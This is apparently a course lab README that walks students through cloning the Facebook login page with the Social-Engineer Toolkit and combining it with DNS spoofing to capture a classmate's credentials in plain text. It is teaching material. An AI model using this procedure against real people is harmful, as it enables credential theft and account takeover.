# Phishing Attack

Phishing is a type of social engineering where an attacker sends a fraudulent (e.g., spoofed, fake, or otherwise deceptive) message designed to trick a person into revealing sensitive information to the attacker (a password or credential) or to deploy malicious software on the victim's infrastructure like ransomware.

Phishing attacks have become increasingly sophisticated and often transparently mirror the site being targeted, allowing the attacker to observe everything while the victim is navigating the site, and transverse any additional security boundaries with the victim. 
 
Phishing is by far the most common attack performed by cybercriminal

## Facebook Phishing Attack
### **Goal**
In this session, our goal is to clone the facebook website and to apply a [**dns spoofing**](https://github.com/fpacenza/NetworkAndSecurity/tree/main/Other%20MITM%20Attacks/DNS%20Spoofing) attack using ettercarp in order to retrieve victim's credentials.

### **Settings**
Work in group with another collegue in order to work on your own laptop (avoiding GNS3 lab)
 * **Attacker:** you (in my case **192.168.1.135**)
 * **Victim:** your collegue (in my case **192.168.1.132**)
 * **Router:** you can use your phone. Both the **Attacker** and the **Victim** must be connected to the same network 

### **Steps**
 1. Follow the guideline in order to perform a [**dns spoofing**](https://github.com/fpacenza/NetworkAndSecurity/tree/main/Other%20MITM%20Attacks/DNS%20Spoofing) attack against the victim ip address
 2. Install ***S**oftware **E**ngineering **Toolkit*** (**setoolkit**)

        git clone https://github.com/trustedsec/social-engineer-toolkit/ set/
        cd set
        sudo python3 setup.py install
 3. Install **Apache2**

        sudo apt update
        sudo apt install apache2
 4. Install and enable **libapache2-mod-php**
        
        sudo apt install libapache2-mod-php*
        sudo a2enmod libapache2-mod-php
    * **Attention:** if comaptibility errors with libapache2-mod-php**5** are shown, disable module libapache2-mod-php

 5. Configure setoolkit

        sudo su
        pico /etc/setoolkit/set.config

    * Edit the following parameters:
        
        * **APACHE_SERVER ON**
        * **APACHE_DIRECTORY /var/www/html**
 6. Run **setoolkit** as superuser
    
        sudo setoolkit

 7. Use the interactive shell to clone the facebook website

        enter 1 - Social-Engineering Attacks
        enter 2 - Website Attack Vectors
        enter 3 - Credential Harvester Attack Method
        enter 2 - Site Cloner
 8. Enter your (**Attacker**) ip address
 9. Enter the website url you want to clone, (e.g., **www.facebook.com**)
 10. On the **Victim** side try to ping **www.facebook.com**

            ping -n www.facebook.com
    
        * You should see the ip address of the **Attacker** instead of the ip address of the (real) facebook server
![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/Phishing/1.dns_spoof_ping_test.png?raw=true)

 11. Navigate **www.facebook.com** from the **Victim** pc
 12. Fillin **username** and **password** fields
 13. Come back to **Attacker** machine e see in **plain text** the username and password as filled in by the **Victim**
 ![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/Phishing/2.phishing.png?raw=true)

**Attention:** if the **Victim** browser has the auto-redirect to https option enabled, the **Victim** will be redirected to **https** web page so, you need to enable also the **ssl** module on your **apache2** webserver 